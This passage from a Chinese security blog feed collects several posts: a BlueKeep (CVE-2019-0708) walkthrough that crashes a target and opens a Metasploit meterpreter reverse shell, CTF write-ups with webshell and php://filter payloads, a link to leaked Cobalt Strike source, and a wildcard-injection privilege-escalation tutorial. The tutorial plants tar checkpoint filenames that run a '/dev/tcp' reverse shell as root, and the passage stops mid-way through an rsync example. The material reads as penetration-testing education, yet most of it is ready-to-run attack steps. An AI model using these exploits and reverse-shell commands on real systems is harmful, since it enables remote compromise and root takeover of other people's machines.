src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2472977457.png"></p><p>使用漏洞POC进行测试：<br>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a><br>用法：python3 crashpoc.py ip地址 系统类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;n1xbyte&#x2F;CVE-2019-0708.git</span><br><span class="line">python3 crashpoc.py 10.1.8.8  64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/954211585.png"></p><p>靶机已蓝屏：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3559546570.png"></p><h1 id="04-反弹shell"><a href="#04-反弹shell" class="headerlink" title="04 反弹shell"></a>04 反弹shell</h1><blockquote><p><a href="https://github.com/biggerwing/CVE-2019-0708-poc">https://github.com/biggerwing/CVE-2019-0708-poc</a></p></blockquote><p>配置msf，将exp放置到msf对应文件夹下，如果同名直接覆盖（这里以kali为例）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3886760211.png"></p><p>将相应的EXP放到kaili里面相应的位置，若是相同文件名就替换，若是不存在的文件就创建。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;rdp.rd</span><br><span class="line">rdp_scanner.rb-&gt;&#x2F;usr&#x2F;share&#x2F;Metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb-&gt;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb-&gt;&#x2F;usr&#x2F;share&#x2F;Metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><p>然后在命令行下执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf5 &gt; reload_all # 加载0708exp</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set rhosts 10.1.8.8</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;show targets</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;set LHOST 10.1.8.167  </span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;set LPORT 1234</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3042730166.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/963131218.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/181923855.png"></p><blockquote><p>注意事项<br>Target要选对；<br>如果没有反弹回来可以尝试换一下监听反弹的端口。</p></blockquote><h1 id="05-批量检测"><a href="#05-批量检测" class="headerlink" title="05 批量检测"></a>05 批量检测</h1><p>这里参考的是<a href="https://github.com/biggerwing/CVE-2019-0708-poc">https://github.com/biggerwing/CVE-2019-0708-poc</a><br>为了方便，我在原来基础上加了个将成功的结果保存在单独文件的功能。</p><p><strong>Windows python3环境</strong><br>用法：</p><ol><li>编辑3389_hosts，将待检测的IP地址写入文件，一行一个</li><li>命令行切换到代码所在的目录，运行python3 cve-2019-0708.py</li></ol><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/253012111.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/591965806.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-原谅杯 2020</title>
      <link href="2020/11/17/2020ctfshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/"/>
      <url>2020/11/17/2020ctfshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="原谅1"><a href="#原谅1" class="headerlink" title="原谅1"></a>原谅1</h2><p><a href="https://pan.baidu.com/s/1Tq_IJGRU-sjjtrW7pxfhIA">附件</a>（提取码：8ouy）</p><p>一张图片一个加密的包，很明显需要通过图片得到密码<br>谐音梗1317bi77p9u ™</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1477852635.png"></p><p>得到如下信息：</p><blockquote><p>剧情1<br>大概一个月前，闲鱼上有个人找到我，希望我能帮忙做一个求婚视频。在和他沟通的过程中，知道他为这次的求婚准备了很久，甚至于半夜我给他看成品的时候，他还在布置场地，那个时候，离他的求婚还有28天。<br>在和他的沟通过程中，能感受到他对女生的珍视。他能细致地讲出每一张照片背后发生的故事，当时的心情和她的情绪。我一边帮他剪视频，一边感受着他们甜甜的恋爱。我这个多愁善感的人当时也是满带祝福的帮他剪完了视频。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3770627338.png"></p><p>把图片丢steg就出flag了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1421393481.png"></p><h2 id="原谅2"><a href="#原谅2" class="headerlink" title="原谅2"></a>原谅2</h2><p>又是个加密的包but有个hint</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2741080403.png"></p><p>火星语转一下成功得到密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3711803311.png"></p><p>解开就拿到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1464559978.png"></p><blockquote><p>PS：剧情2<br>后来到了应该是他求婚的那个晚上，我看到他发了一条朋友圈，说“得之我幸，失之我命”，第二天也是连发了两条消极的朋友圈，我猜他应该是求婚失败了，遗憾之余在评论里安慰了几句。<br>后来微信的消息框里就弹来了他的消息。事情真的是出人意料。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4164112326.png"></p><h2 id="原谅3-来份色图"><a href="#原谅3-来份色图" class="headerlink" title="原谅3_来份色图"></a>原谅3_来份色图</h2><p>很明显得通过图片得到密码从而获取flag<br>binwalk发现有两张png</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3676490941.png"></p><p>foremost分离一下得到两张一样的图片，很明显是盲水印，脚本跑一下即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4122562080.png"></p><h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php isset($_GET[&#39;xbx&#39;])?system($_GET[&#39;xbx&#39;]):highlight_file(__FILE__);</span><br><span class="line">payload：?xbx&#x3D;php -f &#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1923348643.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原谅杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF-公开赛 2020</title>
      <link href="2020/11/15/2020UNCTF-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>2020/11/15/2020UNCTF-%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h2><p><a href="https://pan.baidu.com/s/1Mhxy_nUyEw25vbt2CvCtHQ"><strong>附件</strong></a>（提取码：n39c）</p><p>010打开图片在结尾处发现B站链接</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/598115823.png"></p><p>打开在评论区发现flag</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1547313866.png"></p><h2 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h2><p><a href="https://pan.baidu.com/s/19INkoQyHAJTVs3-oXPA8gA">附件</a>（提取码：jle3）</p><p>不难看出文本就 “就这.”、“就这¿”、“不会吧!”三个关键词，盲猜一手摩斯密码芜湖:airplane:<br>“<strong>就这.<strong>”替换“</strong>.<strong>”；“</strong>就这¿</strong>”替换“**-<strong>”；“</strong>不会吧!<strong>”替换“</strong>/**”</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1208720704.png"></p><p>最后得知这是<a href="https://www.splitbrain.org/services/ook">brainfuck-Ook编码</a><br>“<strong>就这.<strong>”替换“</strong>Ook.<strong>”；“</strong>就这¿</strong>”替换“**Ook?<strong>”；“</strong>不会吧!<strong>”替换“</strong>Ook!**”<br>解码即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3908912025.png"></p><h2 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h2><p><a href="https://pan.baidu.com/s/1u-7AXF3U2Eq4hcZpSAI3sw">附件</a>（提取码：srko）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/246549646.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/241535348.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2856221616.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2000163713.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2267993934.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3164410673.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/935912376.png"></p><p>999999的hint应该就是flag，修改金额即可得到flag（卡住不会™</p><h2 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h2><p><a href="https://pan.baidu.com/s/103QUMLnyDc8ItXnIwNVmxg">附件</a>（提取码：6ivq）</p><p>记事本打开就能看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1173275403.png"></p><h2 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h2><p><a href="https://pan.baidu.com/s/1squl6jlAcD8VzjiJcwh4IQ">附件</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3220251783.png"></p><p>扫码得到flag：unctf{QR@2yB0x}</p><h2 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h2><p>输对十次ylb验证码即可得到flag</p><h2 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h2><p><a href="https://pan.baidu.com/s/1EgjiRxG-hztkQPCdAz-fLQ">附件</a>（提取码：bph4）</p><p>拼图得到flag拼图得到flag<br>①.montage</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage &quot;D:\Harvey\赛题\UNCTF2020\杂项\ez_image\*.jpg&quot; -tile 15x15 -geometry +0+0 result.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2304282341.jpg"></p><p>②.gaps（PS:第一次没拼成功~）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps --image&#x3D;&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;result.png --generation&#x3D;30 --population&#x3D;300 --size&#x3D;60</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2743089469.png"></p><h2 id="零"><a href="#零" class="headerlink" title="零"></a>零</h2><p><a href="https://pan.baidu.com/s/1sziWscrJRNzl_RcQ10CSyQ">附件</a>（提取码：p5o6）</p><p>零宽度字符隐写<br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">在线网站</a>（科学上网）</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3417377872.png"></p><h2 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h2><p><a href="https://pan.baidu.com/s/1KjIEd6VMIrqcV3vLuz9TJg">附件</a></p><p>很明显是个压缩包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/591207936.png"></p><p>查找发现一串字符串（base64</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/540403340.png"></p><p>其中 %7B 和 %7D 分别表示 { 和 }</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1210444813.png"></p><h2 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h2><p><a href="https://pan.baidu.com/s/1T6qkr9c7hSvghOCWlJYmPw">附件</a>（提取码：swwf）</p><p>拖进010查看一下，底部发现base64</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2886110428.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/562922845.png"></p><p>结合题目倒影，倒过来看是个zip的文件头</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2799153501.png"></p><p>打开还是加密的包，爆破打开得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3282112415.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1116856245.png"></p><h2 id="YLB绝密文件"><a href="#YLB绝密文件" class="headerlink" title="YLB绝密文件"></a>YLB绝密文件</h2><p>快做出来了.jpg</p><h2 id="网络深处1"><a href="#网络深处1" class="headerlink" title="网络深处1"></a>网络深处1</h2><blockquote><p>题目描述：好孩子不要上洋葱鸭<br><a href="https://pan.baidu.com/s/1IyMRa9slYcBSK3KcusG7QA">附件</a>（提取码：pjlh）</p></blockquote><p>用Audacity打开,查看频谱图，根据DTMF，分别设置高和低，记下频率，查表，写下手机号15975384265</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/725844625.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/28486961.png"></p><p>或者直接用工具直接解出来</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/732991174.png"></p><p>看第二个音频的频谱图得到Tupper，百度一下可知输入第一个文件得到的k值就可得到flag。（题目里给的那串数字就是k值<br>在线网站：<a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1404594639.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/157590495.png"></p><h2 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h2><p><a href="https://pan.baidu.com/s/1PslL1Tgq2tAzf2eUfIPWtg">附件</a>（提取码：96qu）</p><p>shadow文件 是linux系统中记载root密码的保密性文件</p><p>通过下载 <a href="http://www.openwall.com/john/"><strong>joh</strong>n</a> 工具进行破解</p><p>进入 run 目录，运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show shadow</span><br></pre></td></tr></table></figure><p>最终得到密码123456，md5加密后即为flag</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h2><blockquote><p>题目描述：某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评<br>次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子<br>这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补<br>ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</p></blockquote><p>多次尝试得知是培根密码<br>“<strong>0</strong>”替换“<strong>a</strong>”；“<strong>t</strong>”替换“<strong>b</strong>”。解密得到flag（提交大写的才行…）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3413436341.png"></p><h2 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h2><blockquote><p>题目描述：你过office二级了吗</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3003389888.png"></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/739926366.png"></p><h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><p>文件包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload：?a&#x3D;include $_GET[&quot;harvey&quot;] ?&gt;&amp;harvey&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3581257471.png"></p><p>base64得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2183693196.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike源码分享</title>
      <link href="2020/11/12/CobaltStrike%E6%BA%90%E7%A0%81%E5%88%86%E4%BA%AB/"/>
      <url>2020/11/12/CobaltStrike%E6%BA%90%E7%A0%81%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="CobaltStrike的源代码"><a href="#CobaltStrike的源代码" class="headerlink" title="CobaltStrike的源代码"></a>CobaltStrike的源代码</h2><p>此src代码可以在IDEA中运行，需要jdk8 +，版本5.x</p><h2 id="Github项目地址"><a href="#Github项目地址" class="headerlink" title="Github项目地址"></a>Github项目地址</h2><p><a href="https://github.com/Freakboy/CobaltStrike">https://github.com/Freakboy/CobaltStrike</a></p><h2 id="功能截图"><a href="#功能截图" class="headerlink" title="功能截图"></a>功能截图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2621748566.png"></p><h2 id="CobaltStrike源代码下载地址"><a href="#CobaltStrike源代码下载地址" class="headerlink" title="CobaltStrike源代码下载地址"></a>CobaltStrike源代码下载地址</h2><p>①GitHub: CobaltStrike/archive/master.zip</p><p>下载源代码，可能会报毒，请在虚拟机中解压！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1315185602.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>来自上古的提权技术-通配符注入</title>
      <link href="2020/11/11/%E6%9D%A5%E8%87%AA%E4%B8%8A%E5%8F%A4%E7%9A%84%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5/"/>
      <url>2020/11/11/%E6%9D%A5%E8%87%AA%E4%B8%8A%E5%8F%A4%E7%9A%84%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：正如标题所说，此技术很早以前就有了，但是其中一些利用思路也值得我们借鉴，因为网站运维人员或管理员，经常会备份网站，以及设置一些定时任务来优化网站管理，所有这项攻击技术，我们也会经常用到。</p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在shell终端中，我们经常用通配符来偷懒，来匹配我们想要的内容，无论是文件还是目录，都适用。<br>认识部分通配符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 匹配任意多个字符</span><br><span class="line">? 代表任意单个字符</span><br><span class="line">[ ] 代表“[”和“]”之间的某一个字符，比如[0-9]可以代表0-9之间的任意一个数字，[a-zA-Z]可以代表a-z和A-Z之间的任意一个字母，字母区分大小写。</span><br><span class="line">– 代表一个字符。</span><br><span class="line">~ 用户的根目录。</span><br></pre></td></tr></table></figure><h3 id="通配符劫持的第一次利用-chown命令扩展-chown劫持"><a href="#通配符劫持的第一次利用-chown命令扩展-chown劫持" class="headerlink" title="通配符劫持的第一次利用-chown命令扩展(chown劫持)"></a>通配符劫持的第一次利用-chown命令扩展(chown劫持)</h3><p>如果你对Linux/Unix系统稍微了解过，就知道，在系统下，一切皆文件，而文件也会属于某个用户，某个组，也会相应的文件操作的权限，可读可写可执行。</p><p>而chown命令则可以更改文件的这些属性，详情可以查看linux命令手册。</p><p>其中我们重点关注 –reference=RFILE  选项</p><p>我们来看看它自己给的解释</p><p>use RFILE’s owner and group rather than specifying OWNER:GROUP values</p><p>这句话的意思是，使用的是RFILE文件的所有者和所属组的这个属性，而不是执行命令所带的参数OWNER:GROUP</p><p>我直接用栗子来解释一下：</p><p>如果我要更改script.sh文件的所有者和所属组为test这个用户，当然你前提有root权限，或者root权限执行此命令，我们将输入这样的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R test:test script.sh &#x2F;&#x2F;如果你创建一个test用户，系统将默认创建一个test组，并把test自动加在test组里</span><br></pre></td></tr></table></figure><p>但是如果我不想输入test:test,那我还要其他办法吗？有的，请看下面的栗子：<br>如果此目录下有个11.sh脚本，它文件所有者为test所属组为test组，那么我们可以用–reference=选项来获得我们想要的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown --reference&#x3D;11.sh script.sh</span><br></pre></td></tr></table></figure><p>那么如果我们输入以下命令，命令执行结果会是啥?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R root:root --reference&#x3D;11.sh script.sh</span><br></pre></td></tr></table></figure><p>script.sh文件的所有者将会是test所属组也是test，也就是说，有–reference=FILE选项在，root:root将没有意义，–reference=FILE优先级更高。<br>那么接下来我们的利用就来了，网站运维人员和管理员有时会遇到很多文件和很多目录的需要更改所有者，所属组，那么聪明的运维大大，就会偷一波懒，在终端敲以下命令，并为此很满意，不错不错！不愧是我</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R 某个用户:某个组 *.*</span><br></pre></td></tr></table></figure><p>殊不知，有个黑客早已经在此目录下埋下陷阱：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch hacker.php     &#x2F;&#x2F;创建文件，该文件的所有组和所属者为黑客拿到的shell，例如var用户</span><br><span class="line">touch --reference&#x3D;hacker.php &#x2F;&#x2F;创建一个文件名为--reference&#x3D;hacker.php的文件,这将是劫持的关键点，--reference&#x3D;hacker.php将不是一个文件名了，将会成为chown命令的一个选项</span><br></pre></td></tr></table></figure><p>那么网站管理员一执行命令，该目录下的所有文件所有者将为var用户,所属组将为var组<br>本来hacker拿到的var shell，无法对某些文件进行操作，但现在可以了！感谢管理员大大，神助攻！</p><h3 id="通配符劫持的第二次利用-tar命令的扩展-tar劫持）"><a href="#通配符劫持的第二次利用-tar命令的扩展-tar劫持）" class="headerlink" title="通配符劫持的第二次利用-tar命令的扩展(tar劫持）"></a>通配符劫持的第二次利用-tar命令的扩展(tar劫持）</h3><p>tar命令是我们在linux系统中常用的一条命令，无论是解压文件还是压缩文件，都很nice！<br>一个运营策略比较完善的网站，一般都有备份网站的习惯（备份是一个好习惯），那么运维人员或管理员将输入如下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf &#x2F;var&#x2F;backups&#x2F;html.tgz &#x2F;var&#x2F;www&#x2F;html&#x2F;*</span><br></pre></td></tr></table></figure><p>也有可能会把此命令加入计划任务，定时定期的备份：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;crontab</span><br><span class="line">*&#x2F;1 *  * * *  root tar -zcf &#x2F;var&#x2F;backups&#x2F;html.tgz &#x2F;var&#x2F;www&#x2F;html&#x2F;* &#x2F;&#x2F;这里设置每一分钟对网站进行一次备份</span><br></pre></td></tr></table></figure><p>因为这里直接用了*通配符来匹配网站根目录下的所有文件，所有我们可以加以利用<br>我们在根目录下输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot; &gt; shell.sh &#x2F;&#x2F;反弹shell的文件</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot; &#x2F;&#x2F;因为这里文件名带了空格，所以用了”“</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint&#x3D;1</span><br></pre></td></tr></table></figure><p>这里的–checkpoint-action选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，这里的文件名–checkpoint=1 和 –checkpoint-action=exec=sh shell.sh成为了tar命令的选项<br>这里计划任务运行，你将获得一个root权限的shell，一般计划任务都是root权限</p><h3 id="通配符劫持的第三次利用-rsync命令的扩展-rsync劫持）"><a href="#通配符劫持的第三次利用-rsync命令的扩展-rsync劫持）" class="headerlink" title="通配符劫持的第三次利用-rsync命令的扩展(rsync劫持）"></a>通配符劫持的第三次利用-rsync命令的扩展(rsync劫持）</h3><p>rsync命令是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快,功能相当于数据备份中的差异备份。<br>实际应用场景，大一点网站的数据备份文件都是往专用备份服务器传输的，那么我们也可以劫持rsync来执行任意命令。<br>我们重点关注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e, --rsh&#x3D;command 指定使用rsh、ssh方式进行数据同步。--rsync-path&#x3D;PATH 指定远程服务器上的rsync命令所在路径信息。</span><br></pre></td></tr></table></figure><p>我们直接查看一个示例来学习此命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -t *.* foo：&#x2F;home&#x2F;hacker&#x2F; 